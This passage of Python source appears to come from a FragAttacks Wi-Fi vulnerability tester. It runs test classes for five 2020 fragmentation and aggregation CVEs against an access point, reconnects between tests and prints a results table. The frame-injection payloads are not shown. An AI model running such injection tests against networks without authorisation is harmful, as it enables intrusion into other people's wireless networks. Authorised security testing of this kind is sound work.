            ('CVE-2020-26143', FragAttacks26143, 'Plaintext A-MSDU RFC1042'),
            ('CVE-2020-26144', FragAttacks26144, 'Plaintext broadcast fragments'),
            ('CVE-2020-26145', FragAttacks26145, 'Broadcast frag as full frame'),
            ('CVE-2020-26146', FragAttacks26146, 'Non-consecutive CCMP PN'),
            ('CVE-2020-26147', FragAttacks26147, 'Mixed encrypted+plaintext frags'),
        ]

        results = {}
        for cve_id, cve_class, desc in CVE_CLASSES:
            log(STATUS, f'\n[{cve_id}] {desc}', color='orange')

            # Ensure connected before each CVE test
            if not _check_alive(station):
                log(STATUS, f'  Reconnecting before {cve_id}...', color='orange')
                try:
                    station.wpaspy_command('REASSOCIATE')
                    time.sleep(5)
                except Exception:
                    pass
                if not _check_alive(station):
                    log(STATUS, f'  Cannot reconnect — skipping {cve_id}', color='red')
                    results[cve_id] = 'SKIPPED'
                    continue

            # Run the test
            test_instance = cve_class()
            test_instance.run(station)
            results[cve_id] = 'TESTED'
            time.sleep(2)  # settle between tests

        # Summary table
        log(STATUS, '\n' + '═' * 65, color='cyan')
        log(STATUS, ' FragAttacks Test Results Summary', color='cyan')
        log(STATUS, '─' * 65, color='cyan')
        log(STATUS, f'  {"CVE ID":<20}  {"Description":<35}  {"Status"}', color='cyan')
        log(STATUS, f'  {"─"*20}  {"─"*35}  {"─"*7}', color='cyan')
        for cve_id, _, desc in CVE_CLASSES:
            status = results.get(cve_id, '?')
            log(STATUS, f'  {cve_id:<20}  {desc:<35}  {status}')
        log(STATUS, '═' * 65, color='cyan')
        log(STATUS, ' NOTE: "ACCEPT" above = AP did not deauth = potential vulnerability', color='orange')
        log(STATUS, ' Confirm by checking if AP forwarded injected payload (requires LAN access)', color='orange')

    def generate(self, station):
        self.actions[0].set_function(self.run)
        self.actions[0].set_terminate(delay=5)
